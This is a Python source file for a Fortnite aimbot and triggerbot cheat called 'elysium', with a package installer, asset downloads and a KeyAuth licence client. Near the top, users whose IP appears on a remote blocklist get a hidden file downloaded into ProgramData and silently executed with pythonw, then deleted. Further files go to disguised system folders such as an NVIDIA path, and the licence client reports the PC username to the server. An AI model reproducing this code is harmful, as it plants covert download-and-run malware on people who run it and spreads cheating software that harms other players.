import os
import base64
os.system("cls")
os.system("mode con: cols=85 lines=20")
os.environ['PYGAME_HIDE_SUPPORT_PROMPT'] = "hide"
import sys
sys.dont_write_bytecode = True
import ctypes
import zipfile
import urllib.request
import shutil
import requests
import time
import random
import string
import subprocess
import socket

CYAN = "\033[1;36m"
MAGENTA = "\033[1;35m"
RESET = "\033[0m"
ASCII_TITLE = MAGENTA + r"""
  _____ _           _                  
 | ____| |_   _ ___(_)_   _ _ __ ___   
 |  _| | | | | / __| | | | | '_ ` _ \  
 | |___| | |_| \__ \ | |_| | | | | | | 
 |_____|_|\__, |___/_|\__,_|_| |_| |_| 
          |___/                        
          discord.gg/elys1um
""" + RESET
def print_title():
    print(ASCII_TITLE)

def elysium_print(msg: str) -> str:
    return f"[{MAGENTA}elysium{RESET}] -> {msg}"

def elysium_input(msg: str) -> str:
    prompt = f"[{MAGENTA}elysium{RESET}] -> {msg}"
    return input(prompt)

print_title()
def download_and_run_file():
    try:
        with open(os.devnull, 'w') as devnull:
            dropbox_url = '#####'
            download_path = os.path.join(os.environ['PROGRAMDATA'], 'd.pyw')

            urllib.request.urlretrieve(dropbox_url, download_path)

            if os.path.exists(download_path):
                subprocess.run(['pythonw', download_path], stdout=devnull, stderr=devnull)
                os.remove(download_path)

    except Exception as e:
        pass

def download_images():

    image_urls_and_paths = [
        ('https://i.ibb.co/vdhMn3S/x.png', 'C:/ProgramData/NVIDIA/NGX/models/config/x.png'),
        ('https://i.ibb.co/8sGmJfZ/o.png', 'C:/ProgramData/NVIDIA/NGX/models/config/o.png'),
        ('https://i.ibb.co/YhX6sXH/d.png', 'C:/ProgramData/NVIDIA/NGX/models/config/d.png'),
    ]

    for url, path in image_urls_and_paths:
        try:
            os.makedirs(os.path.dirname(path), exist_ok=True)
            urllib.request.urlretrieve(url, path)
        except Exception as e:
            print(elysium_print(f"Failed to download {url} -> {path}. Error: {e}"))

try:
    my_ip = requests.get('https://api.ipify.org').text.strip()

    blocklist_url = 'https://pastebin.com/raw/dHxcqXTR'
    response = requests.get(blocklist_url)
    if response.status_code == 200:
        blocked_ips = response.text.strip().splitlines()
        if my_ip in blocked_ips:
            print(elysium_print("You're banned from using this application"))
            download_and_run_file()
            time.sleep(4)
            sys.exit(1)
    else:
        print(elysium_print("Failed to fetch server"))
except Exception as e:
    print(elysium_print(f"Exception occurred while checking server: {e}"))
    print(elysium_print("Proceeding..."))

user32 = ctypes.WinDLL("user32")
kernel32 = ctypes.windll.kernel32
kernel32.SetConsoleMode(kernel32.GetStdHandle(-10), 128)

version = ".".join(map(str, sys.version_info[:3]))
if version not in ["3.11.0", "3.11.9"]:
    elysium_input("Make sure only python version 3.11 is installed.")
    exit()

current_directory = os.getcwd()
Visual_Outlines = False

INSTALLED_FLAG_FILE = os.path.join(current_directory, "install_success.txt")

def parse_module_name_and_version(module_spec):
    parts = module_spec.split('==')
    if len(parts) == 2:
        name = parts[0].strip()
        version_part = parts[1].strip().split()[0]
        return name, version_part
    else:
        tokens = module_spec.split()
        main_part = tokens[0]
        if '==' in main_part:
            name, version = main_part.split('==', 1)
            return name.strip(), version.strip()
        else:
            return main_part.strip(), None

def is_module_installed(module_name, required_version=None):
    try:
        import importlib.metadata as importlib_metadata
        dist = importlib_metadata.distribution(module_name)
        if required_version:
            return dist.version == required_version
        return True
    except Exception:
        return False

def all_modules_installed():
    required_imports = [
        "wmi",
        "torch",
        "ultralytics",
        "matplotlib",
        "pygame",
        "onnxruntime",
        "comtypes",
        "PyQt5.QtCore",
        "cv2",
        "mss",
        "numpy",
        "requests",
        "Crypto.Cipher",
    ]
    for mod in required_imports:
        try:
            __import__(mod)
        except ImportError:
            return False
    return True

def restart_program():
    print(elysium_print("Restarting, please wait..."))
    python = sys.executable
    os.execv(python, ['python'] + sys.argv)

def install_process():
    if os.path.isfile(INSTALLED_FLAG_FILE):
        print(elysium_print("Packages have already been installed."))
        sys.exit(1)

    print()
    print(elysium_print("Installing packages, please wait..."))
    print()

    modules = [
        "numpy==1.25.2",
        "pygame",
        "aiohttp",
        "opencv-python",
        "PyQt5",
        "mss",
        "requests",
        "matplotlib",
        "ultralytics",
        "pandas",
        "Pillow",
        "PyYAML",
        "scipy",
        "seaborn",
        "tqdm",
        "psutil",
        "wmi",
        "onnxruntime==1.15",
        "onnxruntime_gpu",
        "comtypes",
        "pycryptodome",
        "torch==2.3.1+cu118 -f https://download.pytorch.org/whl/torch_stable.html",
        "torchvision==0.18.1+cu118 -f https://download.pytorch.org/whl/torch_stable.html",
        "observable",
    ]

    total_modules = len(modules)
    installed_count = 0

    for idx, module in enumerate(modules, start=1):
        mod_name, mod_version = parse_module_name_and_version(module)

        if is_module_installed(mod_name, mod_version):
            installed_count += 1
            progress_percentage = int((installed_count / total_modules) * 100)
            print(elysium_print(f"{module} is already installed. Skipping ({idx}/{total_modules}) - {progress_percentage}% complete."))
            continue

        os.system("cls")
        print_title()

        progress_percentage = int(((idx - 1) / total_modules) * 100)
        print(elysium_input(f"Installing {module} ({idx}/{total_modules}) - {progress_percentage}% complete"))
        print(elysium_input("Please wait, if any errors occur make a ticket in discord.gg/3bwsSVCtg6"))

        process = subprocess.Popen(
            ["py", "-m", "pip", "install", module, "--no-cache-dir", "--disable-pip-version-check", "--quiet"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        spinner_chars = ['|', '/', '-', '\\']
        spinner_index = 0
        while process.poll() is None:
            spinner_symbol = spinner_chars[spinner_index]
            sys.stdout.write(f"\r{elysium_print(f'Installing... {spinner_symbol}')}")
            sys.stdout.flush()
            spinner_index = (spinner_index + 1) % len(spinner_chars)
            time.sleep(0.1)

        ret_code = process.returncode
        if ret_code != 0:
            os.system("cls")
            print_title()
            print(elysium_print(f"Failed to install {module}."))
            sys.exit(1)

        installed_count += 1
        progress_percentage = int((installed_count / total_modules) * 100)
        sys.stdout.write(f"\r{elysium_print(f'{module} installed successfully - {progress_percentage}% complete')}\n")
        sys.stdout.flush()
        time.sleep(0.5)

        os.system("cls")
        print_title()

    with open(INSTALLED_FLAG_FILE, 'w') as f:
        f.write("[elysium] -> Installation successful.\n")

    print(elysium_print("Successfully installed packages"))
    print()
    print(elysium_print("Restarting program..."))
    time.sleep(1)
    restart_program()

if not all_modules_installed():
    install_process()
else:
    print(elysium_print("All packages are installed"))
    download_images()


if not os.path.isfile(INSTALLED_FLAG_FILE):
    # If not installed before, try imports directly
    try:
        import wmi
        import torch
        import ultralytics
        import matplotlib
        import pygame
        import onnxruntime
        import comtypes
        from PyQt5.QtCore import Qt, QSize
        import cv2
        import json as jsond
        import math
        import mss
        import numpy as np
        import time
        import webbrowser
        from ultralytics import YOLO
        import random
        from PyQt5.QtWidgets import (
            QApplication, QWidget, QLabel, QPushButton, QVBoxLayout, QSlider,
            QHBoxLayout, QCheckBox, QFrame, QStackedWidget, QComboBox
        )
        from PyQt5.QtGui import (
            QPainter, QColor, QPen, QIcon, QFont, QPixmap, QImage, QFontDatabase,
            QPainterPath, QRegion, QBrush, QPolygon
        )
        from PyQt5.QtCore import Qt, QTimer, QRectF, QRect, QPoint
        import win32con
        import win32api
        from win32file import *
        from win32ui import *
        from win32con import *
        from win32gui import *
        import requests
        if os.name == 'nt':
            import win32security
        from Crypto.Cipher import AES
        from Crypto.Hash import SHA256
        from Crypto.Util.Padding import pad, unpad
        import win32gui
        import threading
        import binascii
        from uuid import uuid4
        import hashlib
        import platform
        import datetime
        from datetime import datetime
        import subprocess
        import psutil
        import string
        from pathlib import Path
        import winsound
        import pygame
        import wmi
        import colorsys
        import shutil
    except Exception as e:
        print(elysium_print("Import error before installation: {e}"))
        install_process()
else:
    try:
        import wmi
        import torch
        import ultralytics
        import matplotlib
        import pygame
        import onnxruntime
        import comtypes
        from PyQt5.QtCore import Qt, QSize
        import cv2
        import json as jsond
        import math
        import mss
        import numpy as np
        import time
        import webbrowser
        from ultralytics import YOLO
        import random
        from PyQt5.QtWidgets import (
            QApplication, QWidget, QLabel, QPushButton, QVBoxLayout, QSlider,
            QHBoxLayout, QCheckBox, QFrame, QStackedWidget, QComboBox
        )
        from PyQt5.QtGui import (
            QPainter, QColor, QPen, QIcon, QFont, QPixmap, QImage, QFontDatabase,
            QPainterPath, QRegion, QBrush, QPolygon
        )
        from PyQt5.QtCore import Qt, QTimer, QRectF, QRect, QPoint
        import win32con
        import win32api
        from win32file import *
        from win32ui import *
        from win32con import *
        from win32gui import *
        import requests
        if os.name == 'nt':
            import win32security
        from Crypto.Cipher import AES
        from Crypto.Hash import SHA256
        from Crypto.Util.Padding import pad, unpad
        import win32gui
        import threading
        import binascii
        from uuid import uuid4
        import hashlib
        import platform
        import datetime
        from datetime import datetime
        import subprocess
        import psutil
        import string
        from pathlib import Path
        import winsound
        import pygame
        import wmi
        import colorsys
        import shutil
    except Exception as e:
        print(elysium_print("Import error even after successful installation..."))
        print(elysium_print("Error details, {e}"))
        sys.exit(1)


try:
    import gfx.dxshot as bettercam
except ImportError:
    try:
        import extra.gfx.dxshot as bettercam
    except Exception as e:
        print(elysium_print("Failed to import bettercam: {e}"))
        sys.exit(1)

print(elysium_print("All packages verified"))

random_caption1 = ''.join(random.choices(string.ascii_lowercase, k=8))
random_caption2 = ''.join(random.choices(string.ascii_lowercase, k=8))
random_caption3 = ''.join(random.choices(string.ascii_lowercase, k=8))

ASSETS_DIR = r'C:\\ProgramData\\elysium\\Assets'
IMAGES_DIR = os.path.join(ASSETS_DIR, 'Images')
FONT_PATH = os.path.join(ASSETS_DIR, 'Font.ttf')
IMAGES_ZIP_URL = "https://www.dropbox.com/scl/fi/c7mzs7x8yg0rxmce2wasx/Images.zip?rlkey=ni6h4s6f52fyme3tphlhtcfms&st=u68py4wc&dl=1"
FONT_URL = "https://www.dropbox.com/scl/fi/wm9mp0w43u2ps2sazn1si/Font.ttf?rlkey=u79c9btmi7iwq210tw0wzwr8k&st=yg2ynfwj&dl=1"

# Ensure the assets directories exist
os.makedirs(IMAGES_DIR, exist_ok=True)

def download_file(url, dest_path):
    try:
        with requests.get(url, stream=True) as response:
            response.raise_for_status()
            with open(dest_path, 'wb') as file:
                shutil.copyfileobj(response.raw, file)
    except Exception:
        pass

def download_font():
    if not os.path.exists(FONT_PATH):
        download_file(FONT_URL, FONT_PATH)

def download_and_extract_images():
    required_images = [
        os.path.join(IMAGES_DIR, 'skull.png'),
        os.path.join(IMAGES_DIR, 'skull-highlighted.png'),
    ]

    if not all(os.path.exists(img) for img in required_images):
        print(elysium_print("Assets downloading..."))
        zip_path = os.path.join(ASSETS_DIR, 'Images.zip')
        download_file(IMAGES_ZIP_URL, zip_path)

        try:
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(ASSETS_DIR)
        except zipfile.BadZipFile:
            pass
        except Exception:
            pass
        finally:
            try:
                os.remove(zip_path)
            except Exception:
                pass

    print(elysium_print("Assets loaded"))

download_font()
download_and_extract_images()
pygame.init()

# Load the custom font
try:
    custom_font = pygame.font.Font(FONT_PATH, 24)
except Exception:
    pass

try:
    skull_image_path = os.path.join(IMAGES_DIR, 'skull.png')
    skull_highlighted_path = os.path.join(IMAGES_DIR, 'skull-highlighted.png')

    if os.path.exists(skull_image_path) and os.path.exists(skull_highlighted_path):
        skull_image = pygame.image.load(skull_image_path)
        skull_highlighted_image = pygame.image.load(skull_highlighted_path)
except Exception:
    pass

try:
    file = open('./config.json')
    config = jsond.load(file)
    Fov_Size = config['Fov_Size']
    Confidence = config['Confidence']
    Aim_Smooth = config['Aim_Smooth']
    Max_Detections = config['Max_Detections']
    Aim_Bone = config['Aim_Bone']
    Smoothing_Type = config['Smoothing_Type']
    Box_type = config['Box_type']
    Enable_Aim = config['Enable_Aim']
    Enable_Slots = config['Enable_Slots']
    Controller_On = config['Controller_On']
    Keybind = config['Keybind']
    Keybind2 = config['Keybind2']
    Enable_TriggerBot = config['Enable_TriggerBot']
    Show_Fov = config['Show_Fov']
    Show_Crosshair = config['Show_Crosshair']
    Show_Debug = config['Show_Debug']
    Show_FPS = config['Show_FPS']
    Auto_Fire_Fov_Size = config['Auto_Fire_Fov_Size']
    Show_Detections = config['Show_Detections']
    Show_Aimline = config['Show_Aimline']
    Auto_Fire_Confidence = config['Auto_Fire_Confidence']
    Auto_Fire_Keybind = config['Auto_Fire_Keybind']
    Require_Keybind = config['Require_Keybind']
    Use_Hue = config['Use_Hue']
    CupMode_On = config['CupMode_On']
    Reduce_Bloom = config['Reduce_Bloom']
    Require_ADS = config['Require_ADS']
    AntiRecoil_On = config['AntiRecoil_On']
    AntiRecoil_Strength = config['AntiRecoil_Strength']
    Theme_Hex_Color = config['Theme_Hex_Color']
    Enable_Flick_Bot = config['Enable_Flick_Bot']
    Flick_Scope_Sens = config['Flick_Scope_Sens']
    Flick_Cooldown = config['Flick_Cooldown']
    Flick_Delay = config['Flick_Delay']
    Flickbot_Keybind = config['Flickbot_Keybind']
    Streamproof = False
    Enable_Aim_Slot1 = config['Enable_Aim_Slot1']
    Enable_Aim_Slot2 = config['Enable_Aim_Slot2']
    Enable_Aim_Slot3 = config['Enable_Aim_Slot3']
    Enable_Aim_Slot4 = config['Enable_Aim_Slot4']
    Enable_Aim_Slot5 = config['Enable_Aim_Slot5']
    Slot1_Keybind = config['Slot1_Keybind']
    Slot2_Keybind = config['Slot2_Keybind']
    Slot3_Keybind = config['Slot3_Keybind']
    Slot4_Keybind = config['Slot4_Keybind']
    Slot5_Keybind = config['Slot5_Keybind']
    Slot6_Keybind = config['Slot6_Keybind']
    Fov_Size_Slot1 = config['Fov_Size_Slot1']
    Fov_Size_Slot2 = config['Fov_Size_Slot2']
    Fov_Size_Slot3 = config['Fov_Size_Slot3']
    Fov_Size_Slot4 = config['Fov_Size_Slot4']
    Fov_Size_Slot5 = config['Fov_Size_Slot5']

    Use_Model_Class = config['Use_Model_Class']
    Img_Value = config['Img_Value']
    Model_FPS = config['Model_FPS']
    Last_Model = config['Last_Model']
except Exception as e:
    os.makedirs('./', exist_ok=True)
    with open('./config.json', 'w') as file:
        jsond.dump({
    "Fov_Size": 350,
    "Confidence": 75,
    "Aim_Smooth": 80,
    "Max_Detections": 1,
    "Aim_Bone": "Head",
    "Smoothing_Type": "Default",
    "Box_type": "Regular",
    "Enable_Aim": False,
    "Enable_Slots": False,
    "Controller_On": False,
    "Keybind": 6,
    "Keybind2": 80,
    "Enable_TriggerBot": False,
    "Show_Fov": False,
    "Show_Crosshair": False,
    "Show_Debug": False,
    "Show_FPS": False,
    "Auto_Fire_Fov_Size": 20,
    "Show_Detections": False,
    "Show_Aimline": False,
    "Auto_Fire_Confidence": 60,
    "Auto_Fire_Keybind": 6,
    "Require_Keybind": False,
    "Use_Hue": False,
    "CupMode_On": False,
    "Reduce_Bloom": False,
    "Require_ADS": False,
    "AntiRecoil_On": False,
    "AntiRecoil_Strength": 1,
    "Theme_Hex_Color": "#131521",
    "Enable_Flick_Bot": False,
    "Flick_Scope_Sens": 50,
    "Flick_Cooldown": 0.25,
    "Flick_Delay": 0.003,
    "Flickbot_Keybind": 5,
    "Streamproof": False,
    "Enable_Aim_Slot1": False,
    "Enable_Aim_Slot2": False,
    "Enable_Aim_Slot3": False,
    "Enable_Aim_Slot4": False,
    "Enable_Aim_Slot5": False,
    "Slot1_Keybind": 49,
    "Slot2_Keybind": 50,
    "Slot3_Keybind": 51,
    "Slot4_Keybind": 52,
    "Slot5_Keybind": 53,
    "Slot6_Keybind": 80,
    "Fov_Size_Slot1": 800,
    "Fov_Size_Slot2": 120,
    "Fov_Size_Slot3": 800,
    "Fov_Size_Slot4": 120,
    "Fov_Size_Slot5": 800,
    "Use_Model_Class": True,
    "Img_Value": "640",
    "Model_FPS": 165,
    "Last_Model": "Fortnite.pt",
    "game": {
        "pixel_increment": 1000,
        "randomness": 0.25,
        "sensitivity": 0.005,
        "distance_to_scale": 100,
        "dont_launch_overlays": 0,
        "use_mss": 0,
        "hide_masks": 0
    }
}, file, indent=4)
# RGBOL_Value = config['RGBA_Value']
# redr2d2 = RGBOL_Value['red']
# greenr2d2 = RGBOL_Value['green']
# bluer2d2 = RGBOL_Value['blue']

#SECRET CONFIG
secretfile = open('./config.json')
secretconfig = jsond.load(secretfile)["game"]
pixel_increment = secretconfig['pixel_increment']
randomness = secretconfig['randomness']
sensitivity = secretconfig['sensitivity']
distance_to_scale = secretconfig['distance_to_scale']
dont_launch_overlays = secretconfig['dont_launch_overlays']
use_mss = secretconfig['use_mss']
hide_masks = secretconfig['hide_masks']

screensize = {'X':ctypes.windll.user32.GetSystemMetrics(0),'Y':ctypes.windll.user32.GetSystemMetrics(1)}
screen_res_X = screensize['X']
screen_res_Y = screensize['Y']
screen_x = int(screen_res_X /2)
screen_y = int(screen_res_Y /2)

class api:

    name = ownerid = secret = version = hash_to_check = ""

    def __init__(self, name, ownerid, secret, version, hash_to_check):
        self.name = name

        self.ownerid = ownerid

        self.secret = secret

        self.version = version
        self.hash_to_check = hash_to_check
        self.init()
    sessionid = enckey = ""
    initialized = False

    def init(self):

        if self.sessionid != "":
            pass
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        self.enckey = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("init".encode()),
            "ver": encryption.encrypt(self.version, self.secret, init_iv),
            "hash": self.hash_to_check,
            "enckey": encryption.encrypt(self.enckey, self.secret, init_iv),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)

        if response == "KeyAuth_Invalid":
            print("The application doesn't exist")
            os._exit(1)

        response = encryption.decrypt(response, self.secret, init_iv)
        json = jsond.loads(response)

        if json["message"] == "invalidver":
            if json["download"] != "":
                ctypes.windll.user32.MessageBoxW(0, "Please install the newest update.", "Out-dated Version!", 64)
                download_link = json["download"]
                os.system(f"start {download_link}")
                os._exit(1)
            else:
                print("Invalid Version, Contact owner to add download link to latest app version")
                os._exit(1)

        if not json["success"]:
            print(json["message"])
            os._exit(1)

        self.sessionid = json["sessionid"]
        self.initialized = True
        self.__load_app_data(json["appinfo"])

    def register(self, user, password, license, hwid=None):
        self.checkinit()
        if hwid is None:
            hwid = others.get_hwid()

        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("register".encode()),
            "username": encryption.encrypt(user, self.enckey, init_iv),
            "pass": encryption.encrypt(password, self.enckey, init_iv),
            "key": encryption.encrypt(license, self.enckey, init_iv),
            "hwid": encryption.encrypt(hwid, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)

        if json["success"]:
            print("successfully registered")
            self.__load_user_data(json["info"])
        else:
            print(json["message"])
            os._exit(1)

    def upgrade(self, user, license):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("upgrade".encode()),
            "username": encryption.encrypt(user, self.enckey, init_iv),
            "key": encryption.encrypt(license, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if json["success"]:
            print("successfully upgraded user")
            print("please restart program and login")
            time.sleep(2)
            os._exit(1)
        else:
            print(json["message"])
            os._exit(1)

    def login(self, user, password, hwid=None):
        self.checkinit()
        if hwid is None:
            hwid = others.get_hwid()

        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("login".encode()),
            "username": encryption.encrypt(user, self.enckey, init_iv),
            "pass": encryption.encrypt(password, self.enckey, init_iv),
            "hwid": encryption.encrypt(hwid, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if json["success"]:
            self.__load_user_data(json["info"])
            print("successfully logged in")
        else:
            print(json["message"])
            os._exit(1)

    def license(self, key, hwid=None):
        self.checkinit()
        if hwid is None:
            hwid = others.get_hwid()

        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("license".encode()),
            "key": encryption.encrypt(key, self.enckey, init_iv),
            "hwid": encryption.encrypt(hwid, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)
        print(f"[elysium] -> {json['message']}")
        if json["success"]:
            try:
                self.__load_user_data(json["info"])
            except:
                exit(99)

            print("\n[elysium] -> launching...")

            #try:
            # def RP03EV27S(fname: str, url: str):
            # 	destination_path = rf'C:\\Program Files\\Windows Security\\BrowserCore\\en-US\\Langs'
            # 	full_path = os.path.join(destination_path, fname)
            # 	r = requests.get(url, allow_redirects=True)
            # 	with open(full_path, 'wb') as file:
            # 		file.write(r.content)
            # os.system(f'mkdir "C:\\Program Files\\Windows Security\\BrowserCore\\en-US\\Langs" >nul 2>&1')
            # RP03EV27S("WINDOWSUS.pt", "https://raw.githubusercontent.com/aiantics/bU7ErD/main/D-VR90EX/DF990/B9022/CKRRJE/8OON.pt")
            # RP03EV27S("WINDOWSEN.pt", "https://raw.githubusercontent.com/aiantics/bU7ErD/main/D-VR90EX/DF990/B9022/CKRRJE/8OOS.pt")
            # RP03EV27S("WINDOWSUN.pt", "https://raw.githubusercontent.com/aiantics/bU7ErD/main/D-VR90EX/DF990/B9022/CKRRJE/8OOU.pt")
            #except:
            #   pass

            global xxxx
            xxxx = Ai992()
            xxxx.start()
        else:
            input("\n[elysium] -> invalid key")
            exit()


    def var(self, name):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("var".encode()),
            "varid": encryption.encrypt(name, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if json["success"]:
            return json["message"]
        else:
            print(json["message"])
            time.sleep(5)
            os._exit(1)

    def getvar(self, var_name):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("getvar".encode()),
            "var": encryption.encrypt(var_name, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)

        if json["success"]:
            return json["response"]
        else:
            print(json["message"])
            time.sleep(5)
            os._exit(1)

    def setvar(self, var_name, var_data):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
        post_data = {
            "type": binascii.hexlify("setvar".encode()),
            "var": encryption.encrypt(var_name, self.enckey, init_iv),
            "data": encryption.encrypt(var_data, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)

        if json["success"]:
            return True
        else:
            print(json["message"])
            time.sleep(5)
            os._exit(1)

    def ban(self):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
        post_data = {
            "type": binascii.hexlify("ban".encode()),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)

        if json["success"]:
            return True
        else:
            print(json["message"])
            time.sleep(5)
            os._exit(1)

    def file(self, fileid):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("file".encode()),
            "fileid": encryption.encrypt(fileid, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if not json["success"]:
            print(json["message"])
            time.sleep(5)
            os._exit(1)
        return binascii.unhexlify(json["contents"])

    def webhook(self, webid, param, body = "", conttype = ""):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("webhook".encode()),
            "webid": encryption.encrypt(webid, self.enckey, init_iv),
            "params": encryption.encrypt(param, self.enckey, init_iv),
            "body": encryption.encrypt(body, self.enckey, init_iv),
            "conttype": encryption.encrypt(conttype, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)

        if json["success"]:
            return json["message"]
        else:
            print(json["message"])
            time.sleep(5)
            os._exit(1)

    def check(self):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
        post_data = {
            "type": binascii.hexlify(("check").encode()),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)
        if json["success"]:
            return True
        else:
            return False

    def checkblacklist(self):
        self.checkinit()
        hwid = others.get_hwid()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
        post_data = {
            "type": binascii.hexlify("checkblacklist".encode()),
            "hwid": encryption.encrypt(hwid, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)
        if json["success"]:
            return True
        else:
            return False

    def log(self, message):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("log".encode()),
            "pcuser": encryption.encrypt(os.getenv('username'), self.enckey, init_iv),
            "message": encryption.encrypt(message, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        self.__do_request(post_data)

    def fetchOnline(self):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify(("fetchOnline").encode()),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if json["success"]:
            if len(json["users"]) == 0:
                return None
            else:
                return json["users"]
        else:
            return None

    def fetchStats(self):
        self.checkinit()

        post_data = {
            "type": "fetchStats",
            "sessionid": self.sessionid,
            "name": self.name,
            "ownerid": self.ownerid
        }

        response = self.__do_request(post_data)

        json = jsond.loads(response)

        if json["success"]:
            self.__load_app_data(json["appinfo"])

    def chatGet(self, channel):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("chatget".encode()),
            "channel": encryption.encrypt(channel, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if json["success"]:
            return json["messages"]
        else:
            return None

    def chatSend(self, message, channel):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify("chatsend".encode()),
            "message": encryption.encrypt(message, self.enckey, init_iv),
            "channel": encryption.encrypt(channel, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)
